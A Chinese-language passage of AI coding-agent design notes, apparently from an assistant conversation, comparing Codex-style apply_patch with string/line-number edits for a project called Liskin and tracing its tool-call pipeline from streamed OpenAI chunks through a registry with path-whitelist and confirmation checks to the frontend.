相比之下 Claude 的 Edit「找这段字符串、换成那段」对模型友好得多,容错也高(很多实现还做 fuzzy 字符串匹配兜底)。

## 四、量化对比

| 维度                  | **Codex (apply_patch)**        | **Claude (Edit/行号)** |
| --------------------- | ------------------------------ | ---------------------- |
| 单次改动 output token | **高**(+上下文行)              | 低(仅 old/new)         |
| 上下文窗口占用        | **高**(原文须精确驻留)         | 中(记行号即可)         |
| 对模型能力要求        | **高**(精确复现+格式严格)      | 中(模糊匹配可兜底)     |
| 弱模型可用性          | 差(失败率高)                   | 好                     |
| 多处分散修改          | token 成本叠加快               | 较省                   |
| 换来的好处            | 无状态、写时对齐磁盘真相、鲁棒 | 实现简单、省 token     |

## 五、为什么 Codex 仍然选它——代价是有回报的

Codex 接受这些代价,因为它的回报正好打在它的痛点上:

- **它是云端自主执行**,跑的是 GPT-5 顶配模型,token 成本和模型能力**本来就不是约束**
- 它要的是**鲁棒性和无状态**——上下文匹配能在「文件被改过」时安全失败,不会盲目覆盖,这对无人值守场景是刚需
- 强模型 + 精确 patch = 一次改对的成功率高,反而减少返工轮次,**总 token 未必比"改错→重试"的弱方案多**

## 六、对 Liskin 的决策含义

这给你的选型加了一条关键约束——**取决于你打算支持什么模型**:

1. **如果 Liskin 要支持多种模型(包括开源/中小模型)**:Codex 纯路线风险高。中小模型复现上下文容易出错,patch 失败率会拖垮体验。这时 **Claude 路线(行号/字符串 Edit + fuzzy 兜底)更稳**,token 也省,对你「数据飞轮、降本」的目标更友好。

2. **如果只服务强模型(GPT-5/Claude 顶配)**:Codex 路线的代价可接受,换来的无状态和鲁棒很值。

3. **务实折中(再次推荐)**:
   - **缩小上下文窗口**:patch 只带前后 1-2 行而非 3 行,减少 token
   - **行号 + 少量上下文混合**:用行号快速定位 + 1 行上下文校验,既省 token 又有兜底,弱模型也扛得住
   - **fuzzy 匹配兜底**:容忍空白差异,降低对模型「字节级精确」的苛求,直接降低失败率

考虑到你之前提的「推理成功率 47%→99%」「问题解决率」这类 eval 指标和「支持多 provider」的定位,**对模型能力要求低、token 省的方案对你的数据飞轮更有利**——弱模型也能跑通,样本质量更可控。

一句话:**对。Codex 路线用更多 token、更大上下文占用、更高模型能力要求,换来无状态和写时对齐真相的鲁棒性。它适合"强模型 + 云端自主"的 Codex,但如果 Liskin 要兼容中小模型或在意成本,Claude 风格的行号/字符串 Edit(+fuzzy 兜底)更划算——或者走"行号定位 + 1 行上下文校验"的折中,两头的好处都占一点。**

要我把这个折中的 Edit 方案(行号定位 + 轻量上下文校验 + fuzzy 兜底 + 失败重试提示)的具体协议和匹配逻辑写出来吗?
Liskin 工具接口全链路

三层接口 + 一个注册中心，依赖方向只向下：

┌─────────────────────────────────────────────────────────────────┐
│ @liskin/protocol (L1 — 纯粹类型，零依赖) │
│─────────────────────────────────────────────────────────────────│
│ ToolDefinition { name, description, parameters } │
│ ToolCall { id, name, args } │
│ ToolResult { toolCallId, ok, content } │
│ │
│ 这是 LLM 看到的工具形状。protocol 包不涉及任何执行逻辑。 │
└─────────────────────────────────────────────────────────────────┘
↑ import type ↑ import type
│ │
┌─────────┴──────────────────────┐ ┌──────────┴──────────────────┐
│ @liskin/core (L1 — 端口契约) │ │ packages/tools (L2 — 实现) │
│────────────────────────────────│ │─────────────────────────────│
│ ToolPort { │ │ ToolImpl { │
│ list(): ToolDefinition[] │ │ definition: ToolDef │
│ invoke(call, opts): Result │ │ execute(args, ctx): str │
│ } │ │ preflight?(call, ctx) │
│ │ │ } │
│ ConfirmRequiredError { │ │ │
│ call: ToolCall │ │ ToolRegistry implements │
│ } │ │ ToolPort { │
│ │ │ register(impl) │
│ ToolInvokeOptions { │ │ invoke(call) → ToolResult│
│ confirmedCallId? │ │ } │
│ onProgress? │ │ │
│ } │ │ ToolExecContext { │
└────────────────────────────────┘ │ cwd, confirmPolicy, │
│ pathWhitelist, signal │

                                    │                             │
                                    │  ConfirmPolicy:             │
                                    │    auto → 直接放行           │
                                    │    ask  → 抛 ConfirmReqErr  │
                                    │    deny → 抛 Error 拒绝     │
                                    └─────────────────────────────┘

一次工具调用的完整路径

LLM 返回 tool_call: { id:"c1", name:"fs_read", args:{ path:"a.ts" } }
│
▼
runAgent() — 内核主循环
│ 调用 toolPort.invoke(tool_call)
▼
ToolRegistry.invoke(call, opts)
│ ① 按 name 查找 ToolImpl
│ ② 构建 ToolExecContext (cwd, confirmPolicy, whitelist, signal)
│ ③ preflight(call, ctx)
│ ├─ zod 校验入参
│ ├─
description: 'Edits a file...',
parameters: { type: 'object', properties: { ... } },
},
preflight(call, ctx) { ... }, // ← 路径白名单 + 确认策略
async execute(args, ctx) { ... }, // ← 实际逻辑，返回 string
};

// 注册到 ToolRegistry 即生效
registry.register(fsEditTool);

三个不变的约束：

- 内核不感知工具底层：runAgent 只调 ToolPort.invoke()，不知道是 fs_read 还是 MCP 远程服务
- preflight 统一做安全：路径白名单 + 确认策略全在 preflight 阶段，不散落在各工具的 execute 里
- execute 返回 string：最简单的接口——入参 unknown（工具自己用 zod 校验），出参 string（成功就是正文，失败抛 Error，result.ok=false）

```

整条链路，六层转换：

全链路追踪

Layer 1: OpenAI API 流式响应 (SSE chunks)
─────────────────────────────────────────
data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"call_abc",
      "function":{"name":"fs_read"}}]}}]}
data: {"choices":[{"delta":{"tool_calls":[{"index":0,
      "function":{"arguments":"{\"path\":"}}]}}]}
data: {"choices":[{"delta":{"tool_calls":[{"index":0,
      "function":{"arguments":"\"src/a.ts\"}"}}]}}]}
data: {"choices":[{"finish_reason":"tool_calls"}]}
      ↑ 分片下发, name 和 arguments 是分离的, arguments 是 JSON 字符串

Layer 2: stream.ts — 累积 + JSON.parse + 反查原名
─────────────────────────────────────────
handleChoice() → 按 index 累积到 PendingToolCall:
  pendingByIndex[0] = {
    id: "call_abc",
    name: "fs_read",          ← 从 SSE chunks 拼接
    argsBuffer: '{"path":"src/a.ts"}'  ← 逐 chunk 拼
  }

finish_reason="tool_calls" → drainPending():
  toolCallEventsFor():
    JSON.parse(argsBuffer) → { path: "src/a.ts" }  ← 字符串→对象
    resolveOriginalName("fs_read", nameMap) → "fs.read"  ← 还原原名
    yield { kind: "tool_call", call: { id:"call_abc", name:"fs.read", args:{path:"src/a.ts"} } }

Layer 3: loop.ts — runAgent 主循环
─────────────────────────────────
case 'tool_call':
  pendingToolCalls.push(ev.call)
  yield AgentEvent { kind: 'tool_call', call: {...} }  ← 透明展示, 先不执行

LLM 结束 → 顺序执行每个 tool_call:
  invokeWithProgress(call, tools, confirmed):
    tools.invoke(call, { confirmedCallId?, onProgress })

Layer 4: ToolRegistry.invoke()
──────────────────────────────
① 按 call.name("fs.read") 查找 ToolImpl
② preflight(call, ctx)          ← 路径白名单 + 确认策略
③ execute(call.args, ctx)       ← 实际逻辑 (fs.readFile / grep / ...)
④ return { toolCallId:"call_abc", ok:true, content:"1: import ..." }

Layer 5: loop.ts — 结果回灌
───────────────────────────
yield AgentEvent { kind: 'tool_result', result: { ok:true, content:"..." } }
messages.push({
  role: 'tool',
  content: "1: import ...",
  toolCallId: "call_abc"
})

Layer 6: InProcessKernelClient → EventMsg
─────────────────────────────────────────
handleEvent():
  case 'tool_result':
    flush assistant msg (含 toolCalls) → messages
    flush tool msg → messages
    yield EventMsg { type: 'ToolResult', turnId, result: {...} }

→ SSE 帧 → Web 前端 → events.ts reducer → Turn.steps

关键转换点

┌─────────────────┬───────────────────────┬────────────────────┐
│      位置       │         输入          │        输出        │
├─────────────────┼───────────────────────┼────────────────────┤
│                 │ argsBuffer =          │ parsedArgs = {     │
│ stream.ts:28    │ '{"path":"src/a.ts"}' │ path: "src/a.ts" } │
│                 │  (字符串)             │  (对象)            │
├─────────────────┼───────────────────────┼────────────────────┤
│ stream.ts:45    │ name = "fs_read"      │ name = "fs.read"   │
│                 │ (sanitized)           │ (原名 via nameMap) │
├─────────────────┼───────────────────────┼────────────────────┤
│ loop.ts:78      │ LLMEvent.tool_call    │ pendingToolCalls + │
│                 │                       │  yield AgentEvent  │
├─────────────────┼───────────────────────┼────────────────────┤
│ registry.ts:94  │ call.args = { path:   │ impl.execute(args, │
│                 │ "src/a.ts" }          │  ctx) → string     │
├─────────────────┼───────────────────────┼────────────────────┤
│                 │                       │ messages.push({    │
│ loop.ts:155-160 │ ToolResult            │ role: 'tool', ...  │
│                 │                       │ })                 │
└─────────────────┴───────────────────────┴────────────────────┘
```
